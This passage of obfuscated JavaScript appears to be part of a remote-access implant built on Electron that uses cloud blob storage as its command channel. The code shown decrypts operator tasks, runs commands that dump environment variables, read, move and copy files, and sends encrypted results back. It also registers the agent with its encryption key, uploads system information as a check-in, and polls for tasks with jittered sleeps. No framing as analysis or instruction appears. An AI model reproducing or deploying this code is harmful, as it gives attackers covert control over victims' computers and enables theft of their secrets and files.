                                        _0xb7e1e2 = await ls(_0x12171b);
                                      } else {
                                        if (_0x14fc4d[0] == "env") {
                                          let _0x472696 = process.env;
                                          _0xb7e1e2 = JSON.stringify(_0x472696, null, 2);
                                        } else {
                                          if (_0x14fc4d[0] == "cat") {
                                            file = _0x14fc4d[1];
                                            _0xb7e1e2 = await func_File_Read(file);
                                          } else {
                                            if (_0x14fc4d[0] == "pwd") {
                                              _0xb7e1e2 = global.agent.cwd;
                                            } else {
                                              if (_0x14fc4d[0] == "cd") {
                                                _0xb7e1e2 = await func_cd(_0x14fc4d[1]);
                                              } else {
                                                if (_0x14fc4d[0] == "exit") {
                                                  app.quit();
                                                  process.exit(0);
                                                } else {
                                                  if (_0x14fc4d[0] == "mv") {
                                                    src = _0x14fc4d[1];
                                                    dest = _0x14fc4d[2];
                                                    _0xb7e1e2 = await func_File_Move(src, dest);
                                                  } else {
                                                    _0x14fc4d[0] == "cp" && (src = _0x14fc4d[1], dest = _0x14fc4d[2], _0xb7e1e2 = await func_File_Copy(src, dest));
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        return _0xb7e1e2;
      }
    }
    return "";
  } catch (_0x23d75b) {
    debug("[MAIN][COMMAND] Error: " + _0x23d75b + " " + _0x23d75b.stack);
    return "Error: " + _0x23d75b.message + _0x23d75b.stack;
  }
}
ipcMain.on("load-complete", (_0x42c72d, _0x309254) => {
  debug("[LOAD] Load operation completed: " + _0x309254);
});
async function parseTask(_0x5931fd) {
  try {
    const _0x2407df = await func_Base64_Decode(_0x5931fd);
    if (!_0x2407df) {
      debug("[PARSE] Failed to decode base64 task");
      return null;
    }
    const _0x28bf73 = await func_Decrypt(_0x2407df, global.agent.container.key.key, global.agent.container.key.iv);
    if (!_0x28bf73) {
      debug("[PARSE] Failed to decrypt task");
      return null;
    }
    debug("[PARSE] Decrypted task: " + _0x28bf73);
    const _0x16d2d8 = JSON.parse(_0x28bf73);
    const _0x367e6b = new Task(_0x16d2d8.outputChannel, _0x16d2d8.command, _0x16d2d8.uploadChannel, _0x16d2d8.taskid);
    debug("[PARSE] Parsed task: " + JSON.stringify(_0x367e6b));
    return _0x367e6b;
  } catch (_0x24b276) {
    debug("[PARSE] Error parsing task: " + _0x24b276);
    return null;
  }
}
async function DoTask(_0x19b203) {
  try {
    let _0x3212b2 = "";
    const _0x3ca554 = await func_Split_Quoted_String(_0x19b203.command);
    if (!_0x3ca554 || _0x3ca554.length === 0) {
      return;
    }
    _0x3212b2 = await func_Command_Handler(_0x19b203, _0x3ca554);
    _0x3212b2 && (_0x3212b2 = await func_Encrypt(_0x3212b2, global.agent.container.key.key, global.agent.container.key.iv), _0x3212b2 = await func_Base64_Encode(_0x3212b2), await send_output(global.agent.container.name, _0x19b203.outputChannel, _0x3212b2));
  } catch (_0x24ef94) {
    debug(_0x24ef94 + " " + _0x24ef94.stack);
  }
}
async function init() {
  try {
    let _0x4de7c5 = null;
    let _0x3e978a = global.agent.container.blobs;
    debug("[INIT] Creating metaContainer " + global.agent.metaContainer);
    _0x4de7c5 = await func_Container_Create(global.agent.metaContainer);
    if (_0x4de7c5 === false) {
      debug("[INIT][!] Failed to create meta container : " + global.agent.metaContainer);
      return false;
    }
    debug("[INIT] Creating metaContainer blob /" + global.agent.metaContainer + "/" + global.agent.agentid);
    _0x4de7c5 = await func_Blob_Create(global.agent.metaContainer, global.agent.agentid, global.agent.container.name);
    if (_0x4de7c5 === false) {
      debug("[INIT][!] Failed to create meta container blob : " + global.agent.metaContainer + " " + global.agent.agentid);
      return false;
    }
    _0x4de7c5 = await Blob_Set_Metadata(global.agent.metaContainer, global.agent.agentid, {
      stat: Date.now(),
      signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
      hash: await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv)),
      link: global.agent.agentid
    });
    if (_0x4de7c5.status != 200) {
      debug("[INIT][!] Failed to set metadata for meta container blob : " + global.agent.metaContainer + " " + global.agent.agentid);
      return false;
    }
    debug("[INIT] Creating agent container " + global.agent.container.name);
    _0x4de7c5 = await func_Container_Create(global.agent.container.name);
    if (_0x4de7c5 === false) {
      debug("[INIT][!] Failed to create agent container : " + global.agent.container.name);
      return false;
    }
    _0x4de7c5 = await func_Blob_Create(global.agent.container.name, _0x3e978a.in);
    if (_0x4de7c5 === false) {
      debug("[INIT][!] Failed to create container blob " + global.agent.container.name + " " + _0x3e978a.in);
      return false;
    }
    let _0x5b7d5d = await getSystemInfo();
    const _0x360768 = await func_Encrypt(JSON.stringify(_0x5b7d5d, null, 1), global.agent.container.key.key, global.agent.container.key.iv);
    const _0x5930e2 = await func_Base64_Encode(_0x360768);
    _0x4de7c5 = await func_Blob_Create(global.agent.container.name, _0x3e978a.checkin, _0x5930e2);
    if (_0x4de7c5 === false) {
      debug("[INIT][!] Failed to create container blob " + global.agent.container.name + " " + _0x3e978a.checkin);
      return false;
    }
    return true;
  } catch (_0x51583d) {
    debug("[INIT][!] ERROR : \r\n" + _0x51583d + "\r\n " + _0x51583d.stack);
    return false;
  }
}
async function reinitializeAgent() {
  debug("[REINIT] Reinitializing agent");
  global.init = false;
  let _0x2364a = 0;
  while (true) {
    let _0x29a332 = await init();
    if (_0x29a332 === true) {
      debug("[REINIT] Initialization successful");
      break;
    } else {
      _0x2364a++;
      debug("[REINIT] Initialization failed for " + _0x2364a + " time, retrying in 10 seconds... ");
      await new Promise(_0x31fd74 => setTimeout(_0x31fd74, 10000));
    }
  }
}
async function TaskLoop() {
  try {
    debug("[TASKLOOP] Starting task handler");
    while (true) {
      if (!global.init) {
        let _0x1afddd = await func_Blob_Read(global.agent.metaContainer, global.agent.agentid);
        debug("[TASKLOOP] func_Blob_Read response : " + JSON.stringify(_0x1afddd));
        _0x1afddd.status === 200 && _0x1afddd.data == global.agent.container.name && (debug("[TASKLOOP] Agents metaContainer global.agent.agentid " + global.agent.agentid + " is initialized with value " + _0x1afddd.data), global.init = true);
      } else {
        let _0xec8bff = await Blob_Set_Metadata(global.agent.metaContainer, global.agent.agentid, {
          stat: Date.now(),
          signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
          hash: await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv)),
          link: global.agent.agentid
        });
        if (global.mode == "link-tcp" && _0xec8bff === false) {
          debug("[TASKLOOP] " + global.TCPServer.authenticatedClients.size + " clients authenticated.\r\n Waiting for client to connect and authenticate...");
          const _0x4143ac = await global.TCPServer.waitForClient();
          _0x4143ac && (debug("Client connected and authenticated successfully"), debug("[TASKLOOP] ClientConnected : " + _0x4143ac));
        }
        _0xec8bff != false && (_0xec8bff.status != 200 && (await reinitializeAgent()), (await HandleTask()) === false && (await reinitializeAgent()));
      }
      900000 > global.agent.thissleep && global.agent.thissleep > 888 ? (global.agent.thissleep = await getrand(global.agent.sleepinterval * 1000, global.agent.sleepjitter), debug("[TASKLOOP] Sleeping for " + global.agent.thissleep), await new Promise(_0x2f1004 => setTimeout(_0x2f1004, global.agent.thissleep))) : (debug("[TASKLOOP] Sleeping for default 10 seconds"), await new Promise(_0x1c17c8 => setTimeout(_0x1c17c8, 10000)));
    }
  } catch (_0x30da10) {
    debug(_0x30da10 + " " + _0x30da10.stack);
    await TaskLoop();
  }
}
async function HandleTask() {
  try {
    let _0x96020a = await func_Blob_Read(global.agent.container.name, global.agent.container.blobs.in);
    if (_0x96020a.status === 200) {
      await clearBlob(global.agent.container.name, global.agent.container.blobs.in);
      if (_0x96020a.data && _0x96020a.data != null && _0x96020a.data != undefined && _0x96020a.data != "") {
        let _0x48bb4e = await parseTask(_0x96020a.data);
        await DoTask(_0x48bb4e);
      }
      return true;
    } else {
      return false;
    }
  } catch (_0x2c4be4) {
    debug("[!] " + _0x2c4be4 + " " + _0x2c4be4.stack);
    return false;
  }
}